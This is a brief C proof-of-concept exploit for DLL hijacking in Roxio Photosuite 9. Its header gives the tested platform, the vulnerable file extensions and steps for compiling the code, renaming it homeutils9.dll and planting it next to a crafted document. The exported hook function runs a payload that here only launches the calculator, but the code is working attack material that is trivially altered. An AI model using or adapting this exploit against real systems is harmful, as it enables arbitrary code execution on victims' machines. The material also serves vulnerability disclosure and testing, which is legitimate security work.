/*
# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles, Dinesh Arora

Exploit Title:  Roxio photosuite 9 DLL Hijacking Exploit
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3 , Photosuite 9.0
Vulnerable extensions: .dmsp , .pspd

Compile and rename to homeutils9.dll, create a file in the same dir with one
of the following extensions:
.dmsp , .pspd
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}